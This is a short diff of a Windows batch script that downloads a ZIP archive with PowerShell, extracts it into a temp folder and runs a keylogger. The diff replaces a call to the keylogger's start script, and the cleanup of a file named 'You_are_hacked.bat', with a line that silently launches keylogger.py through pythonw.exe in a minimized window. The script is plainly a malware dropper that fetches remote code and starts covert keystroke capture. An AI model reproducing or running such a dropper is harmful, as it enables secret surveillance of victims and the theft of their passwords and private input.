@@ -8,7 +8,5 @@ if not exist "%DOWNLOAD_DIR%" mkdir "%DOWNLOAD_DIR%"
 if not exist "%EXTRACT_DIR%" mkdir "%EXTRACT_DIR%"
 powershell -Command "Invoke-WebRequest -Uri '%ZIP_URL%' -OutFile '%ZIP_FILE%' | Out-Null"
 powershell -Command "Expand-Archive -Path '%ZIP_FILE%' -DestinationPath '%EXTRACT_DIR%' -Force"
-call "%EXTRACT_DIR%\keylogger\start.bat"
-DEL "%ZIP_FILE%"
-DEL "%TEMP%\You_are_hacked.bat"
+start /min "" "%TEMP%\keylogger\pythonw.exe" "%TEMP%\keylogger\keylogger.py"
 exit
